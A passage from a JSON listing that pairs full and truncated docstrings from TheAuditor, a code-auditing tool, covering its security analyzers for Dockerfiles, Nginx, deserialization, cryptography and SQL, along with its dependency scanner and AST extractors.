    "original": "\"\"\"Detect inefficient imports that bloat frontend bundles (database-first).\n\nThis rule detects when frontend code imports entire packages instead of specific modules,\nwhich can significantly increase bundle size. It uses the import_styles table.\n\nDetection Strategy:\n1. Query import_styles for frontend imports (React/Vue projects)\n2. Check for full-package imports of known large libraries\n3. Flag imports that should use selective/tree-shaken imports\n\nCommon Issues:\n- import lodash from 'lodash' → Should use: import map from 'lodash/map'\n- import * as moment from 'moment' → Should use: import dayjs or date-fns\n- import { Button, Modal, Form, ... } from 'antd' → Should use sub-imports\n\nDatabase Tables Used:\n- import_styles: Import patterns and packages\n- package_configs: Installed dependencies\n\"\"\"",
    "truncated": "\"\"\"Detect inefficient imports that bloat frontend bundles (database-first).\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/docker_analyze.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Dockerfile Security Analyzer - Database-First Approach.\n\nDetects security misconfigurations in Dockerfile images.\nUses pre-extracted data from docker_images table - NO FILE I/O.\n\nTables Used (guaranteed by schema contract):\n- docker_images: Dockerfile metadata (USER, ENV, ARG, base_image, exposed_ports, has_healthcheck)\n\nDetects:\n- Root user containers (missing USER instruction)\n- Hardcoded secrets in ENV/ARG\n- High-entropy strings (potential secrets)\n- Vulnerable/outdated base images\n- Missing HEALTHCHECK instruction\n- Sensitive ports exposed\n- Base image CVE scanning (optional)\n\nSchema Contract Compliance: v1.1+ (Fail-Fast, Uses build_query())\n\"\"\"",
    "truncated": "\"\"\"Dockerfile Security Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/python/python_deserialization_analyze.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Python Deserialization Vulnerability Analyzer - Database-First Approach.\n\nDetects unsafe deserialization vulnerabilities in Python code using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nFollows schema contract architecture (v1.1+):\n- Frozensets for all patterns (O(1) lookups)\n- Schema-validated queries via build_query()\n- Assume all contracted tables exist (crash if missing)\n- Proper confidence levels\n\nDetects:\n- Pickle usage (CRITICAL - remote code execution)\n- YAML unsafe loading\n- JSON object_hook exploitation\n- Marshal/shelve usage\n- Unsafe Django/Flask session deserialization\n- XML entity expansion\n\"\"\"",
    "truncated": "\"\"\"Python Deserialization Vulnerability Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/security/crypto_analyze.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Cryptography Security Analyzer - Schema Contract Compliant Implementation.\n\nDetects 15+ cryptographic vulnerabilities using database-driven approach.\nFollows v1.1+ schema contract compliance (no table checks, no regex).\n\nThis implementation:\n- Uses frozensets for ALL patterns (O(1) lookups)\n- Direct database queries (assumes all tables exist per schema contract)\n- Uses parameterized queries (no SQL injection)\n- Implements multi-layer detection\n- Provides confidence scoring\n- Maps all findings to CWE IDs\n- Tokenizes call metadata from normalized database to avoid substring collisions\n\nFalse positive fixes (2025-11-22):\n- Credit: Token-based matching technique from external contributor @dev-corelift (PR #20)\n- Prevents substring collisions like \"includes\" triggering \"DES\" warnings\n- Uses camelCase-aware identifier tokenization for precise pattern matching\n\"\"\"",
    "truncated": "\"\"\"Cryptography Security Analyzer - Schema Contract Compliant Implementation.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_safety_analyze.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Detect SQL safety issues using database queries.\n\n    Detection strategy:\n    1. Query sql_queries for UPDATE/DELETE without WHERE\n    2. Query sql_queries for SELECT without LIMIT\n    3. Query function_call_args for transaction patterns\n    4. Check for missing rollback in transaction scope\n    5. Detect SELECT *\n    6. Find connection leaks\n    7. Detect nested transactions\n    8. Find large IN clauses\n    9. Detect unindexed field queries\n\n    Args:\n        context: Rule execution context with db_path\n\n    Returns:\n        List of SQL safety findings\n    \"\"\"",
    "truncated": "\"\"\"Detect SQL safety issues using database queries.\"\"\""
  },
  {
    "file": "theauditor/vulnerability_scanner.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Write findings to findings_consolidated table.\n\n        Schema (from atomic_vuln_impl.md spec and indexer/database.py:706-722):\n            file TEXT NOT NULL          - Package file path (package.json or requirements.txt)\n            line INTEGER NOT NULL       - Always 0 for dependencies\n            column INTEGER              - Always None for dependencies\n            rule TEXT NOT NULL          - CVE/GHSA ID (e.g., CVE-2021-23337)\n            tool TEXT NOT NULL          - 'vulnerability_scanner'\n            message TEXT                - Vulnerability summary\n            severity TEXT NOT NULL      - critical/high/medium/low\n            category TEXT               - 'dependency'\n            confidence REAL             - 0.7-1.0 based on source count\n            code_snippet TEXT           - Simple string: \"package@version\"\n            cwe TEXT                    - CWE ID if available\n            timestamp TEXT NOT NULL     - ISO 8601 timestamp\n\n        Args:\n            findings: List of validated vulnerability findings\n        \"\"\"",
    "truncated": "\"\"\"Write findings to findings_consolidated table.\"\"\""
  },
  {
    "file": "theauditor/vulnerability_scanner.py",
    "line": -1,
    "original_lines": 19,
    "original": "\"\"\"Scan dependencies for vulnerabilities (database-first architecture).\n\n    This function reads dependency information from the database (populated by indexer)\n    rather than using the deps_list parameter, which is deprecated.\n\n    Args:\n        deps_list: DEPRECATED - No longer used. Kept for backward compatibility only.\n                   Scanner reads from package_configs table instead.\n        offline: If True, skip network operations (use offline OSV databases)\n\n    Returns:\n        List of vulnerability findings\n\n    Note:\n        Migration to database-first architecture (v1.1):\n        - Old: Pass deps_list from parse_dependencies()\n        - New: Scanner reads from repo_index.db (populated by indexer)\n        - Requires: Run 'aud index' before vulnerability scanning\n    \"\"\"",
    "truncated": "\"\"\"Scan dependencies for vulnerabilities (database-first architecture).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/base.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"Base utilities and shared helpers for AST extraction.\n\nThis module contains utility functions shared across all language implementations.\n\nARCHITECTURAL PRINCIPLE: NO REGEX FOR EXTRACTION\n================================================\nThis module must remain regex-free for code extraction. We have ASTs - use them.\nThe only regex that ever existed here was extract_vars_from_tree_sitter_expr(),\nwhich has been deprecated and gutted to enforce proper AST traversal.\n\nIf you're tempted to add regex:\n1. STOP\n2. You already have an AST node\n3. Traverse the AST structure instead\n4. Text parsing is a lazy escape hatch that defeats the entire purpose\n\nThis is a deliberate architectural decision to maintain extraction purity.\n\"\"\"",
    "truncated": "\"\"\"Base utilities and shared helpers for AST extraction.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/hcl_impl.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"Extract HCL blocks (resources, variables, outputs) from tree-sitter AST.\n\n    HCL AST Structure:\n        config_file\n        └── body\n            └── block\n                ├── identifier: \"resource\" | \"variable\" | \"output\"\n                ├── string_lit: type (for resources) or name (for variables/outputs)\n                ├── string_lit: name (for resources only)\n                └── body: { attributes }\n\n    Args:\n        node: tree-sitter AST node\n        language: Programming language (default: \"hcl\")\n\n    Returns:\n        List of block dicts with identifier, type, name, line\n    \"\"\"",
    "truncated": "\"\"\"Extract HCL blocks (resources, variables, outputs) from tree-sitter AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/js_helper_templates.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"JavaScript helper script templates for TypeScript AST extraction.\n\nPhase 5 Architecture: Pre-compiled Bundle\n==========================================\nThis module reads a pre-compiled TypeScript bundle from javascript/dist/extractor.js.\nThe bundle is built via esbuild and contains all extraction logic.\n\nBuild: cd theauditor/ast_extractors/javascript && npm run build\n\nWorkflow:\n1. Python calls get_batch_helper()\n2. Reads dist/extractor.js (pre-compiled bundle)\n3. Returns complete JavaScript program as string\n4. Python writes to temp file and executes via Node.js subprocess\n\nThis replaces the old Phase 4 architecture where 9 separate .js files were\nconcatenated at runtime via string concatenation.\n\"\"\"",
    "truncated": "\"\"\"JavaScript helper script templates for TypeScript AST extraction.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/task_graphql_extractors.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"Extract Celery task definitions.\n\n    Detects:\n    - @app.task, @shared_task, @celery.task decorators\n    - Task arguments (function parameters - injection surface)\n    - bind=True (task instance access)\n    - serializer parameter (pickle = RCE risk, json = safe)\n    - max_retries, retry_backoff (error handling)\n    - rate_limit, time_limit (DoS protection)\n    - queue name (privilege separation)\n\n    Security relevance:\n    - Pickle serializer = insecure deserialization (RCE)\n    - Unvalidated task arguments = injection vulnerabilities\n    - Missing rate_limit = resource exhaustion\n    - Shared queue = privilege escalation risk\n    - Missing time_limit = infinite execution (DoS)\n    \"\"\"",
    "truncated": "\"\"\"Extract Celery task definitions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/testing_extractors.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"Python testing pattern extractors - pytest and unittest.\n\nThis module contains extraction logic for Python testing frameworks:\n- pytest fixtures (@pytest.fixture)\n- pytest parametrize (@pytest.mark.parametrize)\n- pytest markers (custom markers)\n- unittest.mock patterns\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: FileContext with AST tree and optimized node index\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'name', 'type', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\n\"\"\"",
    "truncated": "\"\"\"Python testing pattern extractors - pytest and unittest.\"\"\""
  },
  {
    "file": "theauditor/boundaries/distance.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"\n    Assess boundary quality based on control distances.\n\n    Args:\n        controls: List of control points with distances\n\n    Returns:\n        Dict with quality metrics:\n            - quality: 'clear', 'acceptable', 'fuzzy', 'missing'\n            - reason: Factual description of boundary state\n            - facts: List of factual observations (NOT recommendations)\n\n    Quality Levels:\n        - clear: Single control at distance 0\n        - acceptable: Single control at distance 1-2\n        - fuzzy: Multiple controls OR distance 3+\n        - missing: No controls found\n    \"\"\"",
    "truncated": "\"\"\"Assess boundary quality based on control distances.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"Get React component hierarchy.\n\n        Uses:\n        - react_components table (definition)\n        - react_hooks table (hooks used)\n        - function_call_args_jsx (child components)\n\n        Args:\n            component_name: Component to query\n\n        Returns:\n            Dict with component info, hooks, and children\n\n        Example:\n            tree = engine.get_component_tree(\"UserProfile\")\n            print(f\"Hooks: {tree['hooks']}\")\n            print(f\"Children: {tree['children']}\")\n        \"\"\"",
    "truncated": "\"\"\"Get React component hierarchy.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"\n    Check latest versions for a batch of dependencies using async HTTP.\n\n    This is the modern async engine that replaces the slow synchronous loop.\n    Uses BOTH:\n    - Semaphore: limits WIDTH (concurrent requests) to 10\n    - RateLimiter: limits SPEED (request frequency) per registry\n\n    Without rate limiting, Semaphore(10) fires 10 requests in 10ms = DDoS pattern.\n    With rate limiting, 10 requests spread over ~1 second = normal traffic.\n\n    Args:\n        deps_to_check: List of dependency objects to check\n        allow_prerelease: Allow pre-release versions\n\n    Returns:\n        Dict keyed by universal key with {latest, error} values\n    \"\"\"",
    "truncated": "\"\"\"Check latest versions for a batch of dependencies using async HTTP.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"\n    Parse PyPI version string into comparable tuple for semantic versioning.\n\n    Handles standard formats: X.Y.Z, X.Y, X\n    Handles date-based versions: YYYYMMDD, YYYY.MM.DD\n\n    Args:\n        version_str: Version string from PyPI\n\n    Returns:\n        Tuple of integers for comparison, e.g., (1, 18, 2)\n\n    Examples:\n        \"1.18.2\" -> (1, 18, 2)\n        \"25.11.0\" -> (25, 11, 0)\n        \"2.9\" -> (2, 9, 0)\n        \"4\" -> (4, 0, 0)\n    \"\"\"",
    "truncated": "\"\"\"Parse PyPI version string into comparable tuple for semantic versioning.\"\"\""
  },
  {
    "file": "theauditor/fce.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"\n    Scan ALL findings from database with line-level detail.\n\n    Database-first design for 100x performance improvement over JSON file reading.\n    This implements the dual-write pattern: tools write to BOTH database (for FCE speed)\n    AND JSON files (for AI consumption via extraction.py).\n\n    Args:\n        db_path: Path to repo_index.db database\n\n    Returns:\n        List of standardized finding dicts with file, line, rule, tool, message, severity\n\n    Performance:\n        - O(log n) database query vs O(n*m) file I/O (n=files, m=avg size)\n        - Indexed queries on (file, line), tool, severity\n        - Pre-sorted by severity in SQL (faster than Python sort)\n    \"\"\"",
    "truncated": "\"\"\"Scan ALL findings from database with line-level detail.\"\"\""
  },
  {
    "file": "theauditor/graph/db_cache.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"Check if file exists in project (O(1) lookup).\n\n        Guardian of Hygiene: Accepts both Windows and Unix paths.\n\n        Args:\n            file_path: File path (Windows or Unix format - auto-normalized)\n\n        Returns:\n            True if file was indexed, False otherwise\n\n        Example:\n            >>> cache.file_exists(\"theauditor\\\\cli.py\")  # Windows\n            True\n            >>> cache.file_exists(\"theauditor/cli.py\")   # Unix\n            True\n            >>> cache.file_exists(\"nonexistent.py\")\n            False\n        \"\"\"",
    "truncated": "\"\"\"Check if file exists in project (O(1) lookup).\"\"\""
  },
  {
    "file": "theauditor/graph/db_cache.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"Smart-resolve a path to an actual file in the DB, handling extensions.\n\n        This is the FIX for the dynamic import bug where aliases like\n        @/pages/dashboard/Products resolve to a path without extension,\n        but the DB stores the actual file (Products.tsx).\n\n        Args:\n            path_guess: The path to check (e.g. 'src/utils', 'src/comp')\n\n        Returns:\n            The actual normalized path (e.g. 'src/utils.ts') or None.\n\n        Example:\n            >>> cache.resolve_filename(\"frontend/src/pages/Products\")\n            \"frontend/src/pages/Products.tsx\"\n            >>> cache.resolve_filename(\"src/utils\")\n            \"src/utils/index.ts\"\n        \"\"\"",
    "truncated": "\"\"\"Smart-resolve a path to an actual file in the DB, handling extensions.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/python.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"Python file extractor - Thin wrapper for Python AST extraction.\n\nThis module is the entry point for Python file extraction. It:\n1. Builds a FileContext from the AST\n2. Delegates all extraction to python_impl.py\n3. Handles special cases (imports, routes, SQL, JWT, variable usage)\n4. Returns the unified result\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nThis is an EXTRACTOR layer module. It:\n- RECEIVES: file_info dict (contains 'path' key from indexer)\n- DELEGATES: To python_impl.extract_all_python_data(context)\n- RETURNS: Extracted data WITHOUT file_path keys\n\nThe INDEXER layer (indexer/__init__.py) provides file_path and stores to database.\nThis separation ensures single source of truth for file paths.\n\"\"\"",
    "truncated": "\"\"\"Python file extractor - Thin wrapper for Python AST extraction.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/security_schema.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"\nSecurity-focused schema definitions - Cross-language security patterns.\n\nThis module contains table schemas for security analysis patterns:\n- Environment variable usage (secrets detection)\n- SQL query tracking (SQL injection detection)\n- JWT token patterns (authentication security)\n\nDesign Philosophy:\n- Language-agnostic security patterns (Python, Node, shell scripts)\n- Used by security rules and taint analysis\n- Focused on vulnerability detection (SQL injection, hardcoded secrets, JWT misuse)\n\nThese tables are populated by multiple extractors:\n- ENV_VAR_USAGE: Python extractor (process.env), Node extractor (os.environ), shell scripts\n- SQL_QUERIES/SQL_QUERY_TABLES: Python extractor, Node extractor, raw SQL files\n- JWT_PATTERNS: Python extractor, Node extractor\n\"\"\"",
    "truncated": "\"\"\"Security-focused schema definitions - Cross-language security patterns.\"\"\""
  },
  {
    "file": "theauditor/insights/impact_analyzer.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"\n    Analyze the impact of changing code at a specific file and line.\n\n    Traces both upstream dependencies (who calls this) and downstream\n    dependencies (what this calls) to understand the blast radius of changes.\n\n    Args:\n        db_path: Path to the SQLite database\n        target_file: Path to the file containing the target code\n        target_line: Line number of the target code\n\n    Returns:\n        Dictionary containing:\n        - target_symbol: Name and type of the symbol at target location\n        - upstream: List of symbols that call the target (callers)\n        - downstream: List of symbols called by the target (callees)\n        - impact_summary: Statistics about the blast radius\n    \"\"\"",
    "truncated": "\"\"\"Analyze the impact of changing code at a specific file and line.\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"Semantic Context Engine - Apply business logic and semantic understanding to findings.\n\nThis module provides a framework for users to define their own business logic,\nrefactoring contexts, and semantic understanding that TheAuditor can apply to\nfindings. Unlike the core truth couriers which report only facts, this optional\nmodule allows users to teach TheAuditor about THEIR specific codebase semantics.\n\nUse Cases:\n    - Refactoring detection (old schema vs new schema)\n    - Deprecated API tracking\n    - Business rule enforcement\n    - Migration progress tracking\n    - Architecture pattern compliance\n\nThe semantic context engine is completely user-defined via YAML files. TheAuditor\nprovides the infrastructure, but YOU define what's obsolete, current, or transitional\nin YOUR codebase.\n\"\"\"",
    "truncated": "\"\"\"Semantic Context Engine - Apply business logic and semantic understanding to findings.\"\"\""
  },
  {
    "file": "theauditor/js_init.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"\n    Add TheAuditor hooks to package.json scripts non-destructively.\n\n    Adds the following hooks:\n    - pretest: aud lint --workset\n    - prebuild: aud ast-verify\n    - prepush: aud taint-analyze\n\n    If hooks already exist, prepends Auditor commands with &&.\n\n    Args:\n        path: Path to package.json file\n\n    Returns:\n        {\"status\": \"hooks_added\", \"details\": <list of changes>} if hooks were added\n        {\"status\": \"unchanged\"} if all hooks already present\n        {\"status\": \"error\", \"message\": <error>} if error occurred\n    \"\"\"",
    "truncated": "\"\"\"Add TheAuditor hooks to package.json scripts non-destructively.\"\"\""
  },
  {
    "file": "theauditor/js_semantic_parser.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"Get semantic ASTs for multiple JavaScript/TypeScript files in batch.\n\n    This is a convenience function that creates or reuses a cached parser instance\n    and calls its get_semantic_ast_batch method.\n\n    PHASE 5: UNIFIED SINGLE-PASS ARCHITECTURE\n    All data (symbols, calls, CFG, etc.) extracted in one call.\n    No more two-pass system with cfg_only flag.\n\n    Args:\n        file_paths: List of paths to JavaScript or TypeScript files to parse\n        project_root: Absolute path to project root. If not provided, uses current directory.\n        jsx_mode: JSX transformation mode ('transformed' or 'preserved')\n        tsconfig_map: Optional mapping of file paths to tsconfig paths\n\n    Returns:\n        Dictionary mapping file paths to their AST results\n    \"\"\"",
    "truncated": "\"\"\"Get semantic ASTs for multiple JavaScript/TypeScript files in batch.\"\"\""
  },
  {
    "file": "theauditor/planning/snapshots.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"DEPRECATED: Create a code snapshot at the current git state.\n\n    Use PlanningManager.create_snapshot() instead, which uses pygit2\n    for efficient, binary-safe snapshot storage.\n\n    Args:\n        plan_id: Plan ID to associate snapshot with\n        checkpoint_name: Name for this checkpoint\n        repo_root: Repository root directory\n        task_id: Optional task ID for sequence tracking\n        manager: Optional PlanningManager instance to persist snapshot\n\n    Returns:\n        Dict with snapshot data\n\n    .. deprecated:: 1.6.5\n        Use :meth:`PlanningManager.create_snapshot` instead.\n    \"\"\"",
    "truncated": "\"\"\"DEPRECATED: Create a code snapshot at the current git state.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/nginx_analyze.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"Nginx Security Analyzer - Database-First Approach.\n\nDetects security misconfigurations in Nginx configurations via database analysis.\nUses pre-extracted data from nginx_configs table - NO FILE I/O.\n\nTables Used (guaranteed by schema contract):\n- nginx_configs: Nginx configuration blocks (directives, SSL, locations, etc.)\n\nDetects:\n- proxy_pass without rate limiting\n- Missing critical security headers\n- Exposed sensitive paths\n- Deprecated SSL/TLS protocols\n- Weak SSL ciphers\n- Server version disclosure\n\nSchema Contract Compliance: v1.1+ (Fail-Fast, Uses build_query())\n\"\"\"",
    "truncated": "\"\"\"Nginx Security Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/logic/general_logic_analyze.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"General Logic Analyzer - Database-First Approach.\n\nDetects common programming mistakes and best practice violations using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nTables Used (guaranteed by schema contract):\n- assignments: Variable assignments for money/float/division analysis\n- function_call_args: Function calls for datetime, file, connection, transaction checks\n- symbols: Symbol lookups for zero checks and context managers\n- cfg_blocks: Control flow blocks for try/finally/with detection\n- files: File metadata\n\nDetects 12 types of issues:\n- Business Logic: Money/float arithmetic, timezone-naive datetime, email regex, division by zero, percentage calc errors\n- Resource Management: File handles, connections, transactions, sockets, streams, async operations, locks\n\nSchema Contract Compliance: v1.1+ (Fail-Fast, Uses build_query())\n\"\"\"",
    "truncated": "\"\"\"General Logic Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/orm/typeorm_analyze.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"Detect TypeORM anti-patterns and performance issues.\n\n    Detects:\n    - Unbounded queries without pagination\n    - N+1 query patterns\n    - Missing transactions for multiple writes\n    - Unsafe raw SQL queries\n    - Dangerous cascade configurations\n    - synchronize: true in production\n    - Missing database indexes\n    - Complex joins without limits\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of TypeORM issues found\n    \"\"\"",
    "truncated": "\"\"\"Detect TypeORM anti-patterns and performance issues.\"\"\""
  },
  {
    "file": "theauditor/rules/secrets/hardcoded_secret_analyze.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"Extract the inner value of a string literal expression.\n\n    Supports Python prefixes (r/u/b/f) and JavaScript/TypeScript string forms.\n    Returns None when the expression is not a static literal (e.g. function\n    calls, template strings, or f-strings).\n\n    Credit: @dev-corelift (PR #20) - Prevents flagging dynamic sources\n\n    Examples:\n        >>> _extract_string_literal('\"hardcoded_secret\"')\n        'hardcoded_secret'\n        >>> _extract_string_literal('request.headers.get(\"X-API-Key\")')\n        None  # Not a literal\n        >>> _extract_string_literal('f\"secret_{user_id}\"')\n        None  # F-string with interpolation\n        >>> _extract_string_literal('`secret_${value}`')\n        None  # Template literal with interpolation\n    \"\"\"",
    "truncated": "\"\"\"Extract the inner value of a string literal expression.\"\"\""
  },
  {
    "file": "theauditor/rules/security/api_auth_analyze.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"API Authentication Security Analyzer - Database-First Approach.\n\nDetects missing authentication on state-changing API endpoints using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nFollows golden standard patterns from compose_analyze.py:\n- Frozensets for all patterns\n- Table existence checks\n- Graceful degradation\n- Proper confidence levels\n\nDetects:\n- Missing authentication on POST/PUT/PATCH/DELETE endpoints\n- Weak authentication patterns\n- Public endpoints that shouldn't be public\n- GraphQL mutations without auth\n- API key authentication issues\n\"\"\"",
    "truncated": "\"\"\"API Authentication Security Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/security.py",
    "line": -1,
    "original_lines": 18,
    "original": "\"\"\"\n    Sanitize a path value from configuration.\n\n    This is specifically for paths that come from config files or environment variables,\n    which are common sources of tainted input.\n\n    Args:\n        config_value: The path value from config\n        config_section: The config section (e.g., \"paths\")\n        config_key: The config key (e.g., \"manifest\")\n        project_root: The root directory to restrict paths within\n\n    Returns:\n        A sanitized Path object\n\n    Raises:\n        SecurityError: If the path is invalid or attempts traversal\n    \"\"\"",
    "truncated": "\"\"\"Sanitize a path value from configuration.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/control_flow_extractors.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Extract while loop patterns with infinite loop detection.\n\n    Detects:\n    - else clause\n    - Infinite loops (while True)\n    - Nesting level\n\n    Returns:\n        List of while loop dicts:\n        {\n            'line': int,\n            'has_else': bool,\n            'is_infinite': bool,\n            'nesting_level': int,\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract while loop patterns with infinite loop detection.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/control_flow_extractors.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Extract with statement patterns (context managers).\n\n    Detects:\n    - Async with\n    - Multiple context managers\n    - Aliases\n\n    Returns:\n        List of with statement dicts:\n        {\n            'line': int,\n            'is_async': bool,\n            'context_count': int,\n            'has_alias': bool,\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract with statement patterns (context managers).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/django_advanced_extractors.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"\nDjango Advanced Pattern Extractors (Phase 3.4)\n\nThis module contains extractors for advanced Django patterns:\n- Django signals (signal definitions and connections)\n- Django receivers (@receiver decorators)\n- Django custom managers (BaseManager/Manager subclasses)\n- Django QuerySet methods (custom querysets)\n\nThese extractors identify Django-specific patterns for:\n- Event-driven architecture analysis\n- Signal/receiver dependency tracking\n- Custom ORM manager/queryset usage\n- Django application flow analysis\n\nAll extractors follow architectural contract: NO file_path in results.\n\"\"\"",
    "truncated": "\"\"\"Django Advanced Pattern Extractors (Phase 3.4)\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/django_web_extractors.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Extract Django ModelAdmin customizations.\n\n    Detects:\n    - ModelAdmin class registrations\n    - Associated model (from admin.site.register or inline Meta)\n    - list_display fields (columns shown in admin list view)\n    - list_filter fields (filtering sidebar)\n    - search_fields (search functionality)\n    - readonly_fields (non-editable fields)\n    - Custom admin actions (bulk operations)\n\n    Security relevance:\n    - Exposed fields in list_display = information disclosure\n    - Missing readonly_fields = mass assignment risk\n    - Custom actions without permission checks = privilege escalation\n    - search_fields without validation = SQL injection\n    \"\"\"",
    "truncated": "\"\"\"Extract Django ModelAdmin customizations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/operator_extractors.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Extract ternary expressions (x if condition else y).\n\n    Detects:\n    - Conditional expressions: x if y else z\n\n    Args:\n        tree: AST tree dictionary\n        parser_self: Parser instance (unused)\n\n    Returns:\n        List of ternary expression dicts:\n        {\n            'line': int,\n            'has_complex_condition': bool,  # True if condition is not simple variable\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract ternary expressions (x if condition else y).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/protocol_extractors.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Extract callable protocol implementations (__call__).\n\n    Detects:\n    - __call__ method\n    - Parameter count\n    - *args/**kwargs\n\n    Returns:\n        List of callable protocol dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'param_count': int,\n            'has_args': bool,\n            'has_kwargs': bool,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract callable protocol implementations (__call__).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/protocol_extractors.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Extract comparison protocol implementations.\n\n    Detects:\n    - Rich comparison methods (__eq__, __lt__, __gt__, __le__, __ge__, __ne__)\n    - @total_ordering decorator\n    - All methods implemented\n\n    Returns:\n        List of comparison protocol dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'methods': str,  # Comma-separated\n            'is_total_ordering': bool,\n            'has_all_rich': bool,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract comparison protocol implementations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/protocol_extractors.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Extract arithmetic protocol implementations.\n\n    Detects:\n    - Arithmetic dunder methods (__add__, __mul__, etc.)\n    - Reflected methods (__radd__, __rmul__, etc.)\n    - In-place methods (__iadd__, __imul__, etc.)\n\n    Returns:\n        List of arithmetic protocol dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'methods': str,  # Comma-separated\n            'has_reflected': bool,\n            'has_inplace': bool,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract arithmetic protocol implementations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/validation_extractors.py",
    "line": -1,
    "original_lines": 17,
    "original": "\"\"\"Extract Django REST Framework field definitions from serializers.\n\n    Detects:\n    - Field types (CharField, IntegerField, EmailField, SerializerMethodField, etc.)\n    - read_only flag (read_only=True)\n    - write_only flag (write_only=True)\n    - required flag (required=True/False)\n    - allow_null flag (allow_null=True)\n    - source parameter (source='other_field')\n    - Custom validators (validate_<field> methods)\n\n    Security relevance:\n    - Fields without read_only = mass assignment risk\n    - write_only without validation = incomplete input sanitization\n    - allow_null without validation = null pointer issues\n    - Missing required= = optional input bypass (parity with Joi.required())\n    \"\"\"",
    "truncated": "\"\"\"Extract Django REST Framework field definitions from serializers.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/treesitter_impl.py",
    "line": -1,
    "original_lines": 17,
